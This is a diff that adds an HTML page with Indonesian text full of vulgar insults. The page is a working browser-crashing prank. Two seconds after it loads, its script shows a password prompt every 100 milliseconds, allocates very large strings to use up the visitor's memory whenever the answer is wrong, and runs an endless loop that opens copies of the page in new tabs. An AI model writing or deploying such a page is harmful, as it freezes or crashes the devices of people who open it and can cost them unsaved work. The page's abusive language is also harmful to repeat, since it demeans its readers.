@@ -1,1 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YAHAHA NANGIS YA DEK!</title>
+    <style>
+        body { background: black; color: red; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        h1 { font-size: 50px; }
+    </style>
+</head>
+<body>
+    <h1>TUNGGU BENTAR...</h1>
+    <p>Lagi ngerakit hadiah spesial buat lu, Memek...</p>
+
+    <script>
+        // Password pembuka (biar lu bisa stop kalo mau tes sendiri)
+        const passwordSuci = "cium dulu";
+        
+        function mulaiHancurkan() {
+            let totalMemory = [];
+            console.log("😈 Neraka dimulai, Kontol! 😈");
+
+            // INFINITY LOOP SPAM POP-UP
+            setInterval(() => {
+                let input = prompt("PASSWORD MANA, ANJING?!");
+                if (input === passwordSuci) {
+                    alert("Cih, hoki lu selamat kali ini!");
+                    window.location.href = "https://google.com";
+                } else {
+                    // Kalo salah, kita makan RAM-nya!
+                    for (let i = 0; i < 1000; i++) {
+                        totalMemory.push(new Array(1000000).join('KING-MODEON!-'));
+                    }
+                }
+            }, 100);
+
+            // Bikin tab baru terus menerus (kalo browser gak ngeblock)
+            while(true) {
+                window.open(window.location.href, '_blank');
+            }
+        }
+
+        // Jalankan neraka setelah 2 detik
+        setTimeout(mulaiHancurkan, 2000);
+    </script>
+</body>
+</html>
 
